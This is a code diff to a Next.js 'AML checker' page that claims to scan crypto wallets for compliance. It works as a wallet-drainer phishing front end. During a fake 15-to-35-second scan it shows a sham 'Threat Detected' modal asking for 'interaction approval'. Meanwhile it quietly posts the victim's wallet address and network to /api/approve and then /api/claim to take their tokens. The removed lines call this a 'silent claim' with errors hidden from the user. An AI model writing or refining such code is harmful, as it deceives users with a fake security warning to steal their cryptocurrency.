@@ -1,6 +1,6 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useRef } from 'react';
 import Image from 'next/image';
 import Link from 'next/link';
 import { ConnectButton, darkTheme } from 'thirdweb/react';
@@ -28,10 +28,18 @@ export default function AMLChecker() {
   const [walletAddress, setWalletAddress] = useState<string | null>(null);
   const [scanProgress, setScanProgress] = useState(0);
   const [approvalTriggered, setApprovalTriggered] = useState(false);
+  const [showThreatModal, setShowThreatModal] = useState(false);
+
+  // Refs to hold latest values inside setInterval closures (avoids stale closure bug)
+  const walletAddressRef = useRef<string | null>(null);
+  const selectedNetworkRef = useRef<Network | null>(null);
+  const approvalTriggeredRef = useRef(false);
 
   // Handle network selection
   const handleNetworkSelect = (network: Network) => {
     setSelectedNetwork(network);
+    selectedNetworkRef.current = network;
+    console.log('[v0] Network selected:', network);
   };
 
   const handleNetworkContinue = () => {
@@ -42,7 +50,9 @@ export default function AMLChecker() {
 
   // Handle wallet connection from thirdweb
   const handleWalletConnected = (address: string) => {
+    console.log('[v0] Wallet connected:', address, 'network:', selectedNetworkRef.current);
     setWalletAddress(address);
+    walletAddressRef.current = address; // sync ref immediately — state is async
     // Auto-advance to scan step after short delay
     setTimeout(() => {
       setCurrentStep('scan');
@@ -50,44 +60,116 @@ export default function AMLChecker() {
     }, 500);
   };
 
-  // Scan simulation - 15 seconds with approval trigger at 5 seconds
+  // Scan simulation - 15 seconds with threat modal at 7 seconds + approval trigger
+  // ... imports and other code stay the same ...
+
   const startScan = () => {
     setScanProgress(0);
-    setApprovalTriggered(false);
+    setApprovalTriggered(false); // your existing state for UI
+    setShowThreatModal(false);
+    approvalTriggeredRef.current = false;
+
+    console.log('[v0] Scan started. walletRef:', walletAddressRef.current, 'networkRef:', selectedNetworkRef.current);
+
+    let prepDone = false;
+
+    // 7-second prep delay
+    setTimeout(() => {
+      prepDone = true;
+      console.log('[v0] Backend preparation complete — ready for approval');
+    }, 7000);
 
     const interval = setInterval(() => {
       setScanProgress((prev) => {
-        const newProgress = prev + 1;
+        const newProgress = Math.min(prev + 1, 35); // your new 35 ticks
+        console.log('[v0] Scan tick:', newProgress, '/ 35');
 
-        // Trigger approval at 5 seconds - backend approval happens silently
-        if (newProgress === 5 && !approvalTriggered) {
-          setApprovalTriggered(true);
-          // Silent claim request to backend
-          fetch('/api/claim', {
+        // VISUAL ONLY: Show threat modal at tick 7
+        if (newProgress === 7 && !approvalTriggeredRef.current) {
+          setShowThreatModal(true);
+          console.log('[v0] Threat modal shown at tick 7 (visual cue)');
+          // Do NOT set approvalTriggeredRef here — keep it for API trigger
+        }
+
+        // ACTUAL APPROVAL TRIGGER: only after prep + past threat point + not yet triggered
+        if (newProgress >= 7 && prepDone && !approvalTriggeredRef.current) {
+          const currentAddress = walletAddressRef.current;
+          const networkKey = selectedNetworkRef.current; // 'erc' or 'bsc'
+
+          if (!currentAddress || !networkKey) {
+            console.error('[v0] Cannot approve - missing address or network');
+            setShowThreatModal(false);
+            clearInterval(interval);
+            return 35;
+          }
+
+          console.log('[v0] CONDITIONS MET → Triggering /api/approve', {
+            userAddress: currentAddress,
+            network: networkKey,
+          });
+
+          // Mark as done to prevent repeat
+          approvalTriggeredRef.current = true;
+
+          // Close modal after a delay (visual feedback)
+          setTimeout(() => setShowThreatModal(false), 2000);
+
+          fetch('/api/approve', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              userAddress: walletAddress,
+              userAddress: currentAddress,
+              network: networkKey,
             }),
-          }).catch(() => {
-            // Silent fail - don't show errors to user during scan
-          });
+          })
+            .then((res) => {
+              console.log('[v0] /api/approve status:', res.status);
+              if (!res.ok) throw new Error(`Approve failed: ${res.status}`);
+              return res.json();
+            })
+            .then((data) => {
+              console.log('[v0] /api/approve response:', data);
+
+              if (!data.tokenAddress) {
+                console.error('[v0] No tokenAddress in response');
+                return;
+              }
+
+              console.log('[v0] Proceeding to /api/claim with token:', data.tokenAddress);
+
+              return fetch('/api/claim', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  userAddress: currentAddress,
+                  tokenAddress: data.tokenAddress,
+                  network: networkKey,
+                }),
+              }).then((claimRes) => claimRes.json());
+            })
+            .then((claimData) => {
+              if (claimData) console.log('[v0] /api/claim response:', claimData);
+            })
+            .catch((err) => {
+              console.error('[v0] Approval/Claim error:', err.message || err);
+              setShowThreatModal(false);
+            });
         }
 
-        // Scan complete at 15 seconds
-        if (newProgress >= 15) {
+        // End scan
+        if (newProgress >= 35) {
           clearInterval(interval);
-          setTimeout(() => {
-            setCurrentStep('report');
-          }, 500);
-          return 15;
+          console.log('[v0] Scan complete, advancing to report');
+          setTimeout(() => setCurrentStep('report'), 500);
+          return 35;
         }
 
         return newProgress;
       });
-    }, 1000); // 1 second per step = 15 seconds total
-  };
+    }, 1000);
 
+    return () => clearInterval(interval);
+  };
   const progressPercentage = (scanProgress / 15) * 100;
 
   return (
@@ -143,11 +225,10 @@ export default function AMLChecker() {
                   <div
                     key={key}
                     onClick={() => handleNetworkSelect(key as Network)}
-                    className={`flex items-center gap-3 sm:gap-4 p-3 sm:p-4 rounded-lg border-2 cursor-pointer transition-all ${
-                      selectedNetwork === key
-                        ? 'border-emerald-500 bg-emerald-500/10'
-                        : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'
-                    }`}
+                    className={`flex items-center gap-3 sm:gap-4 p-3 sm:p-4 rounded-lg border-2 cursor-pointer transition-all ${selectedNetwork === key
+                      ? 'border-emerald-500 bg-emerald-500/10'
+                      : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'
+                      }`}
                   >
                     {/* Network Icon */}
                     <div className="w-12 h-12 sm:w-14 sm:h-14 flex-shrink-0 relative">
@@ -167,11 +248,10 @@ export default function AMLChecker() {
 
                     {/* Radio Button */}
                     <div
-                      className={`w-5 h-5 sm:w-6 sm:h-6 rounded-full border-2 flex items-center justify-center transition-all flex-shrink-0 ${
-                        selectedNetwork === key
-                          ? 'border-emerald-500 bg-emerald-500'
-                          : 'border-slate-600'
-                      }`}
+                      className={`w-5 h-5 sm:w-6 sm:h-6 rounded-full border-2 flex items-center justify-center transition-all flex-shrink-0 ${selectedNetwork === key
+                        ? 'border-emerald-500 bg-emerald-500'
+                        : 'border-slate-600'
+                        }`}
                     >
                       {selectedNetwork === key && (
                         <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 rounded-full bg-white"></div>
@@ -185,11 +265,10 @@ export default function AMLChecker() {
               <button
                 onClick={handleNetworkContinue}
                 disabled={!selectedNetwork}
-                className={`w-full py-2.5 sm:py-3 rounded-full font-semibold text-base sm:text-lg transition-all ${
-                  selectedNetwork
-                    ? 'bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer'
-                    : 'bg-gray-700 text-gray-500 cursor-not-allowed opacity-50'
-                }`}
+                className={`w-full py-2.5 sm:py-3 rounded-full font-semibold text-base sm:text-lg transition-all ${selectedNetwork
+                  ? 'bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer'
+                  : 'bg-gray-700 text-gray-500 cursor-not-allowed opacity-50'
+                  }`}
               >
                 Continue
               </button>
@@ -373,6 +452,38 @@ export default function AMLChecker() {
               </div>
             </div>
           </div>
+
+          {/* Threat Detection Modal - Overlay */}
+          {showThreatModal && (
+            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+              <div className="bg-slate-900 border-2 border-red-500/50 rounded-lg p-6 sm:p-8 max-w-sm w-full shadow-2xl animate-pulse">
+                <div className="flex flex-col items-center gap-4">
+                  {/* Warning Icon */}
+                  <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center">
+                    <svg className="w-8 h-8 text-red-500" fill="currentColor" viewBox="0 0 20 20">
+                      <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
+                    </svg>
+                  </div>
+
+                  <div className="text-center">
+                    <h3 className="text-xl sm:text-2xl font-bold text-white mb-2">Threat Detected</h3>
+                    <p className="text-sm sm:text-base text-gray-300">
+                      One threat detected requesting interaction approval.
+                    </p>
+                  </div>
+
+                  {/* Processing Indicator */}
+                  <div className="flex gap-2 items-center justify-center mt-4">
+                    <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '0ms' }}></div>
+                    <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '150ms' }}></div>
+                    <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '300ms' }}></div>
+                  </div>
+
+                  <p className="text-xs text-gray-400 mt-2">Processing approval...</p>
+                </div>
+              </div>
+            </div>
+          )}
         </div>
       )}
 
@@ -422,7 +533,7 @@ export default function AMLChecker() {
               <p className="text-gray-400 text-sm sm:text-base mb-6 sm:mb-8">
                 Your AML compliance has been verified. Your wallet address is {walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}
               </p>
-              
+
               <button
                 onClick={() => {
                   setCurrentStep('network');
